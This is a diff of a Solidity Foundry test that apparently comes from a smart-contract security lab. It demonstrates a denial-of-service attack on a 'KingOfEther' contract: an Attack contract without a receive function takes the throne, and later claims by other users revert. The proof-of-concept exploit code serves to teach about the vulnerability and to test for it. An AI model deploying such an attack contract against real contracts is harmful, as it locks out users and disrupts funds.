@@ -29,29 +29,20 @@ contract ContractTest is Test {
         AttackerContract = new Attack(KingOfEtherContract);
     }
 
-    function testDOS() public {
-        address alice = vm.addr(1);
-        address bob = vm.addr(2);
-        vm.deal(address(alice), 4 ether);
-        vm.deal(address(bob), 2 ether);
-        vm.prank(alice);
-        KingOfEtherContract.claimThrone{value: 1 ether}();
-        vm.prank(bob);
-        KingOfEtherContract.claimThrone{value: 2 ether}();
-        console.log(
-            "Return 1 ETH to Alice, Alice of balance",
-            address(alice).balance
-        );
-        AttackerContract.attack{value: 3 ether}();
+    function testAttack() public {
+        // call attacker contract
+        AttackerContract.attack{value: 1 ether}();
+        assertEq(KingOfEtherContract.king(), address(AttackerContract));
+        // Now the contract is denied for any new winner
+        address user1 = address(1);
 
-        console.log(
-            "Balance of KingOfEtherContract",
-            KingOfEtherContract.balance()
-        );
-        console.log("Attack completed, Alice claimthrone again, she will fail");
-        vm.prank(alice);
-        vm.expectRevert("Failed to send Ether");
-        KingOfEtherContract.claimThrone{value: 4 ether}();
+        //expect revert when other user sending 1 ether more than contract balance
+        vm.deal(user1, 2 ether);
+
+        vm.startPrank(user1);
+        vm.expectRevert();
+        KingOfEtherContract.claimThrone{value: 2 ether}();
+        vm.stopPrank();
     }
 
     receive() external payable {}
@@ -78,8 +69,9 @@ contract Attack {
     constructor(KingOfEther _kingOfEther) {
         kingOfEther = KingOfEther(_kingOfEther);
     }
-
     function attack() public payable {
         kingOfEther.claimThrone{value: msg.value}();
     }
+    //There is no receive function here. Due to this main contract can be made denial of servioce as it will keep trying to send ether
+    //    receive() external payable {}
 }
